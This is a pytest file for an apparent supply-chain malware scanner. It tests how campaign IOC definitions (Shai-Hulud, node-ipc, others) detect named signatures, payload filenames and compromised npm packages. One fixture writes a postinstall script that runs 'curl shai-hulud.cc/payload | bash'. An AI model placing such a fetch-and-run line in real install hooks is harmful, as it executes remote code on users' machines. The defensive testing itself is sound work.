"""
Tests for the per-campaign IOC package system.

Covers:
  - CampaignPackage base class: iocs.json loading, indicator compilation
  - iter_campaigns() auto-discovery
  - Engine integration: each campaign is registered under its L2-CAMP-* rule_id
  - Named-signature fast path: literal-string match in source → CRITICAL
  - Payload-filename detection: known malicious filename → MEDIUM+ finding
  - Package-match: compromised package@version → EXACT-conf CRITICAL finding
  - Negative test: clean directory produces no findings
"""

from __future__ import annotations

import json
from pathlib import Path

from picosentry.scan.campaigns import (
    iter_campaigns,
    list_campaigns,
)
from picosentry.scan.engine import create_default_engine

# ── Auto-discovery ─────────────────────────────────────────────────────────


def test_list_campaigns_finds_all_expected() -> None:
    """All four campaign packages shipped with v2.0.0 are discoverable."""
    found = {p.name for p in list_campaigns()}
    assert "shai_hulud" in found
    assert "node_ipc_compromise" in found
    assert "trapdoor" in found
    assert "axios_poisoning" in found


def test_iter_campaigns_yields_working_instances() -> None:
    """Each campaign auto-discovers and instantiates without error."""
    camps = list(iter_campaigns())
    ids = {c.campaign_id for c in camps}
    assert "shai-hulud-2025" in ids
    assert "node-ipc-compromise-2022" in ids
    assert "trapdoor-2024" in ids
    assert "axios-poisoning-2024" in ids

    # All have the required metadata
    for c in camps:
        assert c.campaign_id
        assert c.rule_id.startswith("L2-CAMP-")
        assert c.iocs_path.is_file()
        # Severity parses to a valid Severity enum
        sev = c.severity()
        assert sev.value in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}


# ── Iocs.json shape ────────────────────────────────────────────────────────


def test_shai_hulud_iocs_has_required_fields() -> None:
    shai = next(c for c in iter_campaigns() if c.campaign_id == "shai-hulud-2025")
    data = shai.iocs()
    for field_name in (
        "campaign_id", "schema_version", "severity",
        "description", "ecosystem", "rule_id",
    ):
        assert field_name in data, f"missing {field_name}"
    ind = data["indicators"]
    assert "named_signatures" in ind
    assert "c2_domains" in ind
    assert "compromised_packages" in ind
    # Shai-Hulud must include the actual worm payload name as a named signature
    assert "setup_bun.js" in ind["named_signatures"]
    # The Shai-Hulud C2 domain is well-known
    assert "shai-hulud.cc" in ind["c2_domains"]


# ── Detection primitives ──────────────────────────────────────────────────


def test_named_signature_match_fires_critical(tmp_path: Path) -> None:
    """A file containing a Shai-Hulud named signature produces a CRITICAL finding."""
    shai = next(c for c in iter_campaigns() if c.campaign_id == "shai-hulud-2025")
    malicious = tmp_path / "evil.js"
    malicious.write_text("// stole the npm token, then ran setup_bun.js\n", encoding="utf-8")

    findings = shai.detect_named_signatures(tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "L2-CAMP-SHAI-HULUD"
    assert f.severity.value == "CRITICAL"
    assert "setup_bun.js" in f.evidence


def test_named_signature_no_match_returns_empty(tmp_path: Path) -> None:
    """A clean file with no malware signatures produces no findings."""
    shai = next(c for c in iter_campaigns() if c.campaign_id == "shai-hulud-2025")
    (tmp_path / "benign.js").write_text('console.log("hello world");\n', encoding="utf-8")
    findings = shai.detect_named_signatures(tmp_path)
    assert findings == []


def test_payload_filename_match_fires_medium(tmp_path: Path) -> None:
    """A file whose name matches a known payload filename fires a MEDIUM finding."""
    shai = next(c for c in iter_campaigns() if c.campaign_id == "shai-hulud-2025")
    payload = tmp_path / "bun_environment.js"
    payload.write_text("module.exports = {};\n", encoding="utf-8")

    findings = shai.detect_payload_filenames(tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "L2-CAMP-SHAI-HULUD"
    assert f.confidence.value == "MEDIUM"
    assert "bun_environment.js" in f.evidence


def test_package_match_fires_exact_for_compromised_version(tmp_path: Path) -> None:
    """An installed package@version matching compromised_packages fires EXACT confidence."""
    from picosentry.scan.models import Confidence, Severity

    shai = next(c for c in iter_campaigns() if c.campaign_id == "shai-hulud-2025")

    # Build a fake node_modules tree with a compromised version
    nm = tmp_path / "node_modules" / "shai-hulud"
    nm.mkdir(parents=True)
    pkg_json = nm / "package.json"
    pkg_json.write_text(
        json.dumps({"name": "shai-hulud", "version": "1.0.0"}), encoding="utf-8"
    )

    findings = shai.detect_packages(tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "L2-CAMP-SHAI-HULUD"
    assert f.confidence == Confidence.EXACT
    assert f.severity == Severity.CRITICAL
    assert "shai-hulud@1.0.0" in f.package


def test_clean_directory_no_findings(tmp_path: Path) -> None:
    """A clean target directory produces zero findings across all four campaigns."""
    # Add a couple of files that look legit
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "index.js").write_text(
        'const express = require("express");\n', encoding="utf-8"
    )
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "clean-app", "version": "0.1.0", "dependencies": {}}),
        encoding="utf-8",
    )
    for c in iter_campaigns():
        assert c.detect(tmp_path, Path("/tmp")) == [], f"{c.campaign_id} produced false positive"


# ── Engine integration ────────────────────────────────────────────────────


def test_create_default_engine_registers_all_campaigns() -> None:
    """create_default_engine wires up all four campaign packages."""
    engine = create_default_engine()
    rule_ids = engine.list_rules()
    camp_rules = [r for r in rule_ids if r.startswith("L2-CAMP-")]
    assert "L2-CAMP-SHAI-HULUD" in camp_rules
    assert "L2-CAMP-NODE-IPC-COMPROMISE" in camp_rules
    assert "L2-CAMP-TRAPDOOR" in camp_rules
    assert "L2-CAMP-AXIOS-POISONING" in camp_rules


def test_full_scan_against_malicious_fixture(tmp_path: Path) -> None:
    """End-to-end: a project containing a C2 domain + a named signature fires both rules."""
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(
        json.dumps({"name": "evil-app", "version": "0.1.0"}), encoding="utf-8"
    )
    # The postinstall script contains BOTH a C2 domain (L2-NETEX-001) AND a
    # named signature (L2-CAMP-SHAI-HULUD, via the literal "setup_bun.js").
    (tmp_path / "postinstall.js").write_text(
        "require('child_process').execSync('curl shai-hulud.cc/payload | bash');\n"
        "const code = require('./setup_bun.js');\n",
        encoding="utf-8",
    )

    engine = create_default_engine()
    result = engine.scan(tmp_path, rules=["L2-CAMP-SHAI-HULUD", "L2-NETEX-001"])
    rule_ids = {f.rule_id for f in result.findings}
    # Both rules fire: the C2 domain check (L2-NETEX-001) and the named
    # signature literal-string match (L2-CAMP-SHAI-HULUD).
    assert "L2-CAMP-SHAI-HULUD" in rule_ids
    assert "L2-NETEX-001" in rule_ids


def test_full_scan_finds_setup_bun_named_signature(tmp_path: Path) -> None:
    """Named signature 'setup_bun.js' inside a project file is caught."""
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "version": "0.1.0"}), encoding="utf-8"
    )
    (tmp_path / "install.js").write_text(
        "const code = require('./setup_bun.js');\n", encoding="utf-8"
    )
    engine = create_default_engine()
    result = engine.scan(tmp_path, rules=["L2-CAMP-SHAI-HULUD"])
    assert any(f.rule_id == "L2-CAMP-SHAI-HULUD" for f in result.findings)


# ── Per-campaign IoC schema validation ────────────────────────────────────


def test_all_campaign_iocs_have_valid_severity() -> None:
    """Every campaign iocs.json has a parseable severity field."""
    for camp_path in list_campaigns():
        data = json.loads((camp_path / "iocs.json").read_text(encoding="utf-8"))
        assert data["severity"] in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, (
            f"{camp_path.name}: severity must be one of CRITICAL/HIGH/MEDIUM/LOW"
        )


def test_all_campaign_iocs_have_valid_rule_id_format() -> None:
    """Every campaign iocs.json declares an L2-CAMP-* rule_id that matches its folder."""
    for camp_path in list_campaigns():
        data = json.loads((camp_path / "iocs.json").read_text(encoding="utf-8"))
        rule_id = data["rule_id"]
        assert rule_id.startswith("L2-CAMP-"), f"{camp_path.name}: rule_id must start with L2-CAMP-"
        # The rule_id should be derivable from the folder name (kebab-cased uppercase)
        expected = "L2-CAMP-" + camp_path.name.upper().replace("_", "-")
        assert rule_id == expected, (
            f"{camp_path.name}: rule_id {rule_id!r} does not match expected {expected!r} "
            f"(derived from folder name). Keep them in sync to maintain the convention."
        )
